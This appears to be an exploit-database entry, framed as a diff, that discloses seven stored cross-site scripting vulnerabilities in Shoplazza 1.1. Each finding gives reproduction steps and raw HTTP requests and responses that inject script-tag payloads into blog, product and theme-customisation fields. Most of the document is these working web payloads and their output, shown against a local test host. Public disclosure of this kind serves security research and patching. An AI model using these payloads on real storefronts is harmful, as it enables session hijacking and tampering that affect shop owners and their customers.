@@ -1,0 +1,234 @@
+id: 38108
+date: 12/15/2022
+title: Shoplazza 1.1 Cross Site Scripting Vulnerability
+author: Andrey Stoykov
+cves: 
+
+# Exploit Title: Shoplazza 1.1 - Stored Cross Site Scripting
+# Exploit Author: Andrey Stoykov
+# Software Link: https://github.com/Shoplazza/LifeStyle
+# Version: 1.1
+# Tested on: Ubuntu 20.04
+
+
+Stored XSS #1:
+
+To reproduce do the following:
+
+1. Login as normal user account
+2. Browse "Blog Posts" -> "Manage Blogs" -> "Add Blog Post"
+3. Select "Title" and enter payload "><script>alert(1)</script>
+
+
+// HTTP POST request showing XSS payload
+
+PATCH /admin/api/admin/articles/2dc688b1-ac9e-46d7-8e56-57ded1d45bf5 HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
+[...]
+
+{"article":{"id":"2dc688b1-ac9e-46d7-8e56-57ded1d45bf5","title":"Title\"><script>alert(1)</script>","excerpt":"Excerpt\"><script>alert(2)</script>","content":"<p>\"><script>alert(3)</script></p>"[...]
+
+
+// HTTP response showing unsanitized XSS payload
+
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+[...]
+
+{"article":{"title":"Title\"><script>alert(1)</script>","excerpt":"Excerpt\"><script>alert(2)</script>","published":true,"seo_title":"Title\"><script>alert(1)</script>"[...]
+
+
+// HTTP GET request to trigger XSS payload
+
+GET /blog/titlescriptalert1script?st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NzAzMzE5MzYsInN0b3JlX2lkIjo1MTA0NTksInVzZXJfaWQiOiI4NGY4Nzk4ZC03ZGQ1LTRlZGMtYjk3Yy02MWUwODk5ZjM2MDgifQ.9ybPJCtv6Lzf1BlDy-ipoGpXajtl75QdUKEnfj9L49I HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
+[...]
+
+
+// HTTP response showing unsanitized XSS payload
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+[...]
+
+<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<title>Title"><script>alert(1)</script></title>
+<meta name="keywords" content="test1205">
+[...]
+
+
+Stored XSS #2:
+
+To reproduce do the following:
+
+1. Login as normal user account
+2. Browse "Products" -> "Create Product"
+3. Select "Subtitle" and enter payload "><script>alert(1)</script>
+
+
+// HTTP POST request showing XSS payload
+
+POST /admin/api/admin/v2_products HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
+[...]
+
+{"product":{"id":"","title":"Title","brief":"Subtitle\"><script>alert(1)</script>","description":"<p>Description</p>"[...]
+
+
+// HTTP response showing unsanitized XSS payload
+
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+[...]
+{"product":{"brief":"Subtitle\"\u003e\u003cscript\u003ealert(1)\u003c/script\u003e","category_id":"","collections
+[...]
+
+
+Stored XSS #3:
+
+To reproduce do the following:
+
+1. Login as normal user account
+2. Browse "Online Store" -> "Themes" -> "Customize" -> "Announcement"
+3. Select "Text" section and enter payload "><script>alert(1)</script>
+4. Select "Mobile Text" section and enter payload "><script>alert(1)</script>
+
+
+// HTTP POST request showing XSS payload
+
+PATCH /admin/api/theme-edit/442430617951435468/temp-template-datas/061cf44d-f20e-42f4-9cde-54a74f240fef/sections/announcement HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
+
+
+// HTTP response showing unsanitized XSS payload
+
+{"section":{"type":"announcement","settings":{"enable_view_all":true},"blocks":[{"type":"announcement","settings":{"text":"Announcement\"><script>alert('Announcement')</script>","mobile_text":"Mobile Text\"><script>alert('Mobile Text')</script>\n","countdown_time":1,"link":null,"link_text":"Shop now"}},{"type":"announcement","settings":{"text":"Welcome to our store","mobile_text":"Welcome to our store","countdown_time":1,"link":null,"link_text":"Shop [...]
+
+
+
+Stored XSS #4:
+
+1. Login as normal user account
+2. Browse "Online Store" -> "Themes" -> "Customize" -> "Product" 
+3. Select "Subheading" and enter payload "><script>alert(1)</script>
+3. Select "Heading" and enter payload "><script>alert(1)</script>
+4. Select "Text" and enter payload "><script>alert(1)</script>
+5. Select "Button Text" and enter payload "><script>alert(1)</script>
+6. Select "Label" and enter payload "><script>alert(1)</script>
+
+
+// HTTP POST request showing XSS payload
+
+PATCH /admin/api/theme-edit/442439399796402892/temp-template-datas/2f973e0e-6711-4e5f-8f55-8f34b4bdbd31/sections/1664528667835 HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
+[...]
+
+{"section":{"name":"feature_product","cname":{"en-US":"Feature Product","zh-CN":""},"category":{"en-US":"Promotion","zh-CN":""},"ccategory":{"en-US":"Promotion","zh-CN":""},"display":true,"blocks":[{"type":"Product","settings":{"auto_display":true,"subheading":"Products\"><script>alert('Product')</script>","heading":"Product_Subheading\"><script>alert('Product_Subheading')</script>","text":"Product_Text\"><script>alert('Product_Text')</script>","btn_text":"Button_Text\"><script>alert('Button_Text')</script>","label_text":"Label_Text\"><script>alert('Label_Text')</script>",
+[...]
+
+
+// HTTP response showing unsanitized XSS payload
+
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=UTF-8
+[...]
+{"section":{"name":"feature_product","cname":{"en-US":"Feature Product","zh-CN":""},"category":{"en-US":"Promotion","zh-CN":""},"ccategory":{"en-US":"Promotion","zh-CN":""},"display":true,"blocks":[{"type":"Product","settings":{"auto_display":true,"subheading":"Products\"><script>alert('Product')</script>","heading":"Product_Subheading\"><script>alert('Product_Subheading')</script>","text":"Product_Text\"><script>alert('Product_Text')</script>","btn_text":"Button_Text\"><script>alert('Button_Text')</script>","label_text":"Label_Text\"><script>alert('Label_Text')</script>"
+[...]
+
+
+Stored XSS #5:
+
+1. Login as normal user account
+2. Browse "Online Store" -> "Themes" -> "Customize" -> "Product Carousel" 
+3. Select "Heading" and enter payload "><script>alert(1)</script>
+4. Select "Description" and enter payload "><script>alert(1)</script>
+
+
+// HTTP POST request showing XSS payload
+
+PATCH /admin/api/theme-edit/442439399796402892/temp-template-datas/2f973e0e-6711-4e5f-8f55-8f34b4bdbd31/sections/1664529790755 HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
+[...]
+
+{"section":{"name":"product_carousel","cname":{"en-US":"Products carousel","zh-CN":""},"category":{"en-US":"Product","zh-CN":""},"category":{"en-US":"Product","zh-CN":""},"icon":"oss/operation/cbff8870e3db05817270bcb0e8c52870.svg","display":true,"settings":{"heading":" Products Carousel\"><script>alert('Product Carousel')</script>","auto_display":true,"collection":null,"desc":"Product Description\"><script>alert('Product Description')</script>
+[...]
+
+
+// HTTP response showing unsanitized XSS payload
+
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=UTF-8
+[...]
+{"heading":" Products Carousel\"><script>alert('Product Carousel')</script>","auto_display":true,"collection":null,"desc":"Product Description\"><script>alert('Product Description')</script>"[...]\">Product Description\"><script>alert('Product Description')</script>
+[...]
+
+
+
+Stored XSS #6:
+
+1. Login as normal user account
+2. Browse "Online Store" -> "Themes" -> "Customize" -> "Text with Icons" -> "Free Shipping"
+3. Select "Heading" and enter payload "><script>alert(1)</script>
+4. Select "Text" and enter payload "><script>alert(1)</script>
+5. Browse "Online Store" -> "Themes" -> "Customize" -> -> "Text with Icons" -> "Free Shipping" Worldwide Shipping"
+6. Select "Heading" and enter payload "><script>alert(1)</script>
+7. Select "Text" and enter payload "><script>alert(1)</script>
+8. Browse "Online Store" -> "Themes" -> "Customize" -> -> "Text with Icons" -> "Member Discount"
+9. Select "Heading" and enter payload "><script>alert(1)</script>
+10. Select "Text" and enter payload "><script>alert(1)</script>
+11. Browse "Online Store" -> "Themes" -> "Customize" -> -> "Text with Icons" -> "Icon"
+12. Select "Heading" and enter payload "><script>alert(1)</script>
+13. Select "Text" and enter payload "><script>alert(1)</script>
+
+
+// HTTP POST request showing XSS payload
+
+PATCH /admin/api/theme-edit/442443380824229324/temp-template-datas/2f973e0e-6711-4e5f-8f55-8f34b4bdbd31/sections/1664529794334 HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
+[...]
+
+{"section":{"name":"icon_text","cname":{"zh-CN":"","en-US":"Text with icons"},"category":{"en-US":"Image with text","zh-CN":""},"ccategory":{"en-US":"Image with text","zh-CN":""},"icon":"oss/operation/b3117ddd140480a503655c157b1af934.svg","display":true,"blocks":[{"type":"icon","settings":{"icon":"free_shipping","heading":"Free shipping\"><script>alert('Free_Shipping')</script>","text":"Free worldwide shipping\"><script>alert('Free world wide shipping')</script>","link":""}},{"type":"icon","settings":{"icon":"customer_service","heading":"Free worldwide shipping\"><script>alert('Free worldwide shipping')</script>","text":"Text\"><script>alert('Text')</script>","link":""}},{"type":"icon","settings":{"icon":"secure_payment","heading":" Member Discount\"><script>alert('Member Discount')</script>","text":"Our payment in formation is processed securely\"><script>alert('Our payment in formation is processed securely')</script>","link":""}},{"type":"icon","settings":{"icon":"contact_us","heading":" Contact us\"><script>alert('Contact us')</script>","text":"Short content about your store\"><script>alert('Short content about your store')</script>"
+[...]
+
+
+// HTTP response showing unsanitized XSS payload 
+
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=UTF-8
+[...]
+{"section":{"name":"icon_text","cname":{"zh-CN":"","en-US":"Text with icons"},"category":{"en-US":"Image with text","zh-CN":""},"ccategory":{"en-US":"Image with text","zh-CN":""},"icon":"oss/operation/b3117ddd140480a503655c157b1af934.svg","display":true,"blocks":[{"type":"icon","settings":{"icon":"free_shipping","heading":"Free shipping\"><script>alert('Free_Shipping')</script>","text":"Free worldwide shipping\"><script>alert('Free world wide shipping')</script>","link":""}},{"type":"icon","settings":{"icon":"customer_service","heading":"Free worldwide shipping\"><script>alert('Free worldwide shipping')</script>","text":"Text\"><script>alert('Text')</script>","link":""}},{"type":"icon","settings":{"icon":"secure_payment","heading":" Member Discount\"><script>alert('Member Discount')</script>","text":"Our payment in formation is processed securely\"><script>alert('Our payment in formation is processed securely')</script>","link":""}},{"type":"icon","settings":{"icon":"contact_us","heading":" Contact us\"><script>alert('Contact us')</script>"[...]"><script>alert('Member Discount')</script>","text":"Our payment in formation is processed securely\"><script>alert('Our payment in formation is processed securely')</script>","link":""}},{"type":"icon","settings":{"icon":"contact_us","heading":" Contact us\"><script>alert('Contact us')</script>","text":"Short content about your store\"><script>alert('Short content about your store')</script>
+[...]
+
+
+Stored XSS #7:
+
+1. Login as normal user account
+2. Browse "Online Store" -> "Themes" -> "Customize" -> "Review Flow"
+3. Select "Title" and enter payload "><script>alert(1)</script>
+
+
+// HTTP POST request showing XSS payload
+
+PATCH /admin/api/theme-edit/442443380824229324/temp-template-datas/2f973e0e-6711-4e5f-8f55-8f34b4bdbd31/sections/1670588315547 HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
+[...]
+
+{"section":{"name":{"en-US":"Review Flow","zh-CN":""},"type":"shoplazza://apps/internal-product-reviews-masonry/blocks/review/48597947633379239","settings":{"star_least":"5","with_photo":true,"show_product":true,"title":"Customer Review\"><script>alert('Customer Reviews')</script>
+[...]
+
+
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=UTF-8
+[...]
+{"section":{"name":{"en-US":"Review Flow","zh-CN":""},"type":"shoplazza://apps/internal-product-reviews-masonry/blocks/review/48597947633379239","settings":{"star_least":"5","with_photo":true,"show_product":true,"title":"Customer Review\"><script>alert('Customer Reviews')</script>"
+[...]
+
+#  0day.today [2023-03-27]  #
